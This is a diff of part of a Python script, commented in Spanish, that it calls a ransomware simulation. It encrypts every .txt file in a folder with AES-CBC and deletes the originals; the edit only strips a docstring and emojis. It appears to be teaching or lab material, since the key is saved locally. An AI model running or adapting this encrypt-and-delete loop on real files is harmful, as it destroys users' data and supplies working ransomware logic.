@@ -15,7 +15,6 @@ with open("clave.key", "wb") as key_file:
     key_file.write(key)
 
 def encrypt_file(file_path, key, iv):
-    """Cifra un archivo con AES-CBC y guarda el resultado en un archivo .enc"""
     with open(file_path, "rb") as f:
         plaintext = f.read()
     
@@ -25,13 +24,13 @@ def encrypt_file(file_path, key, iv):
     with open(file_path + ".enc", "wb") as f:
         f.write(iv + ciphertext)  # Guardamos IV junto con el cifrado
     
-    os.remove(file_path)  # 🔥 Eliminar archivo original (simulación de ransomware)
+    os.remove(file_path)  # Eliminar archivo original (simulación de ransomware)
 
 # 🔹 Cifrar todos los archivos .txt en la carpeta
 for filename in os.listdir(folder_path):
     file_path = os.path.join(folder_path, filename)
     if filename.endswith(".txt"):
         encrypt_file(file_path, key, iv)
-        print(f"🔒 Archivo cifrado: {filename}")
+        print(f"Archivo cifrado: {filename}")
 
-print("🚀 ¡Todos los archivos han sido cifrados!")
+print("Todos los archivos han sido cifrados!")
